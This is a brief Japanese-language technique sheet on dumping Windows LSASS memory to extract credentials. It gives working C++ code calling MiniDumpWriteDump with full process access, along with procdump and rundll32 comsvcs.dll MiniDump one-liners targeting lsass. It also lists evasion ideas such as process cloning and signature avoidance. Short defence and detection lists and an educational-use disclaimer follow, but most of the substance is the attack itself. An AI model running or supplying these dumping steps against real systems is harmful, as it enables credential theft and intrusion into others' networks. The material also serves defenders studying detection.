# LSASS Memory Dumping Techniques

**対応OS**: Windows

## 概要
Local Security Authority Subsystem Service (LSASS)からクレデンシャルを抽出する手法について解説します。

## 基本的な手法

### MiniDumpWriteDumpの使用
```cpp
#include <windows.h>
#include <dbghelp.h>

BOOL CreateDump(DWORD processId, LPCWSTR dumpPath)
{
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    HANDLE hFile = CreateFile(dumpPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL, NULL);
        
    BOOL success = MiniDumpWriteDump(hProcess,
        processId,
        hFile,
        MiniDumpWithFullMemory,
        NULL,
        NULL,
        NULL);
        
    CloseHandle(hFile);
    CloseHandle(hProcess);
    return success;
}
```

### コマンドラインツールの使用
```powershell
# Task Managerを使用
taskmgr.exe > Create Dump File

# ProcDumpの使用
procdump.exe -ma lsass.exe lsass.dmp

# Comsvcsを使用
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <lsass_pid> lsass.dmp full
```

## 検知回避テクニック
- プロセスのクローン作成
- 直接メモリアクセス
- シグネチャの回避
- タイミング制御

## 防御策
- LSASSの保護モード有効化
- メモリダンプの制限
- プロセスアクセスの監視
- EDRソリューションの導入

## 検知方法
- LSASSへのアクセス監視
- 不審なプロセス作成
- ファイル作成の監視
- メモリアクセスパターン

## 注意事項
- このテクニックは教育目的でのみ使用してください
- 実環境での使用は法的責任を伴う可能性があります
- すべてのテストは許可された環境でのみ行ってください 